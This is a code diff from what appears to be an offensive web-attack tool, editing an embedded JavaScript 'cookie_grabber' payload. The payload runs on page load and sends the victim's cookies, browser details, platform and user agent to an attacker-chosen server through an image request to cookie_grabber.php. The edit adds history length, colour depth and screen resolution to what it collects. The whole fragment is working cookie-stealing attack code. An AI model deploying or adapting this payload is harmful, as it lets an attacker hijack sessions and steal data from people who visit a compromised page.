@@ -329,7 +329,7 @@ req.send();
 '''
 
         cookie_grabber_code = '''function InterceptForm() {
-new Image().src = "http://''' + tcp_server + '''/cookie_grabber.php?sessionID="+"Browser: [" + navigator.appName + "] Browser Version: [" + navigator.appVersion + "] Operating System: [" + navigator.platform + "] User Agent: [" + navigator.userAgent + "] Cookie: [" + document.cookie + "] Java Enabled: [" + navigator.javaEnabled + "]";
+new Image().src = "http://''' + tcp_server + '''/cookie_grabber.php?sessionID="+" Browser: [" + navigator.appCodeName + "] Browser Version: [" + navigator.appVersion + "] Operating System: [" + navigator.platform + "] User Agent: [" + navigator.userAgent + "] Cookie: [" + document.cookie + "] Java Enabled: [" + navigator.javaEnabled + "] Pages viewed: [" + history.length + "] Color depth: [" + window.screen.colorDepth + "] Screen resolution: [" + screen.width + "x" + screen.height + "]";
 }       
 window.addEventListener("load", InterceptForm());
 
